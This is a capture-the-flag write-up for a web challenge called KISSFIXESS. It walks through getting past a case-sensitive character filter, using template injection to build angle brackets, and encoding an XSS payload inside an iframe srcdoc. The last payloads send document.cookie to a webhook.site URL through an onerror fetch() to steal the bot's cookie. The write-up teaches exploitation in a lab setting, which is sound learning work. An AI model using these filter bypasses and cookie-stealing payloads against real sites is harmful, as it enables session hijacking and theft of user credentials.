# 🏷️ KISSFIXESS

**Category:** Web  
**Description:**  
> Kiss My Fixes.

This is the important things from the app.py

```py
lookup = TemplateLookup(directories=[os.path.dirname(__file__)], module_directory=MODULE_DIR)

banned = ["s", "l", "(", ")", "self", "_", ".", "\"", "\\", "import", "eval", "exec", "os", ";", ",", "|"]


def escape_html(text):
    """Escapes HTML special characters in the given text."""
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("(", "&#40;").replace(")", "&#41;")

def render_page(name_to_display=None):
    """Renders the HTML page with the given name."""
    templ = html_template.replace("NAME", escape_html(name_to_display or ""))
    template = Template(templ, lookup=lookup)
    return template.render(name_to_display=name_to_display, banned="&<>()")

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):

        # Parse the path and extract query parameters
        parsed_url = urlparse(self.path)
        params = parse_qs(parsed_url.query)
        name = params.get("name_input", [""])[0]
        
        for b in banned:
            if b in name:
                name = "Banned characters detected!"
                print(b)

        # Render and return the page
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(render_page(name_to_display=name).encode("utf-8"))
```

<br />
As we can see the banned list check doesn't check for capital case letters.
<br />

```py
        for b in banned:
            if b in name:
                name = "Banned characters detected!"
                print(b)
```

<br />
So we can enter "Src" and it will be fine.
<br />
<img/src="https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/1.png">
<br />
Now we need to think about getting a xss using open and closing tag but it's blocked but we have an ssti here in render_page function 
<br />

```py

    templ = html_template.replace("NAME", escape_html(name_to_display or ""))
    template = Template(templ, lookup=lookup)
    return template.render(name_to_display=name_to_display, banned="&<>()")
```

<br />

So we can access anything from banned list which contain our needed string using the ssti we have the open and closing tag for xss in banned here, so to get `<` for example we can do `${banned[1]}` this will get us `<` Let's try get `<`: 

<br />
<img/src="https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/2.png">
<br />

As we can see it worked now can get a working payload like `<img src=x onerror=alert()>`

I replaced s with S and l with L 

<br />

```${banned[1]}img Src=x onerror=aLert`1`${banned[2]}```

<br />
<img/src="https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/3.png">
<br />

But if we want to insert the webhook it will contain a lot of things that blocked but we can use encoding since we have `${banned[0]}` as `&` we can use html encoding for instance `${banned[0]}#x3d` get converted to `=` 



Let's make a script that will help us convert everything 
<br />

```py
st, nd, td = [f"${{banned[{i}]}}" for i in range(3)]

inner_html = (
    '<img SRC=x onerror="alert(1)">'
)

hex_encoded = "".join(f"{st}#x{ord(c):02x}" for c in inner_html)
```

will gave us this 

```
${banned[0]}#x3c${banned[0]}#x69${banned[0]}#x6d${banned[0]}#x67${banned[0]}#x2f${banned[0]}#x73${banned[0]}#x72${banned[0]}#x63${banned[0]}#x3d${banned[0]}#x78${banned[0]}#x20${banned[0]}#x6f${banned[0]}#x6e${banned[0]}#x65${banned[0]}#x72${banned[0]}#x72${banned[0]}#x6f${banned[0]}#x72${banned[0]}#x3d${banned[0]}#x61${banned[0]}#x6c${banned[0]}#x65${banned[0]}#x72${banned[0]}#x74${banned[0]}#x28${banned[0]}#x31${banned[0]}#x29${banned[0]}#x3e
```

<br />
<img/src="https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/9.png">
<br />

But when we try it it's rendered as text we can use an iframe to load it as html

```py
st, nd, td = [f"${{banned[{i}]}}" for i in range(3)]

inner_html = (
    '<img SRC=x onerror="alert(1)">'
)

hex_encoded = "".join(f"{st}#x{ord(c):02x}" for c in inner_html)

payload = f"{nd}iframe Srcdoc='{hex_encoded}' {nd}/iframe{td}"


print("\n[+] Final Payload:\n", payload)
```

This is the payload to get alert(1)

```
${banned[1]}iframe Srcdoc='${banned[0]}#x3c${banned[0]}#x69${banned[0]}#x6d${banned[0]}#x67${banned[0]}#x20${banned[0]}#x53${banned[0]}#x52${banned[0]}#x43${banned[0]}#x3d${banned[0]}#x78${banned[0]}#x20${banned[0]}#x6f${banned[0]}#x6e${banned[0]}#x65${banned[0]}#x72${banned[0]}#x72${banned[0]}#x6f${banned[0]}#x72${banned[0]}#x3d${banned[0]}#x22${banned[0]}#x61${banned[0]}#x6c${banned[0]}#x65${banned[0]}#x72${banned[0]}#x74${banned[0]}#x28${banned[0]}#x31${banned[0]}#x29${banned[0]}#x22${banned[0]}#x3e' ${banned[1]}/iframe${banned[2]}
```
<br />

<img/src="https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/4.png">

<br />
Let's try call our webhook:

```py
st, nd, td = [f"${{banned[{i}]}}" for i in range(3)]

inner_html = (
    '<img SRC=x onerror="fetch(\'https://webhook.site/5e62010d-de88-4bf6-8084-881d88f8e883/?q=\'+document.cookie)"/>'
)

hex_encoded = "".join(f"{st}#x{ord(c):02x}" for c in inner_html)

payload = f"{nd}iframe Srcdoc='{hex_encoded}' {nd}/iframe{td}"


print("\n[+] Final Payload:\n", payload)
```
<br />

Got a callback, Let's report to the bot:

<br />

<img/src="https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/5.png">

<br />

We didn't get callback, looking at the bot, Found this option that will disable image loading:
<br />

```py
chrome_opts.add_argument("--blink-settings=imagesEnabled=false")
```

Let's try another payload that doesn't contain an image

```py
st, nd, td = [f"${{banned[{i}]}}" for i in range(3)]

inner_html = (
    '<audio SRC=x onerror="fetch(\'https://webhook.site/5e62010d-de88-4bf6-8084-881d88f8e883?q=\'+document.cookie)">'
)

hex_encoded = "".join(f"{st}#x{ord(c):02x}" for c in inner_html)

payload = f"{nd}iframe Srcdoc='{hex_encoded}' /{td}{nd}/iframe{td}"


print("\n[+] Final Payload:\n", payload)
```

Got it:
<br/>
<img/src="https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/7.png">
<br />

<img/src="https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/8.png">
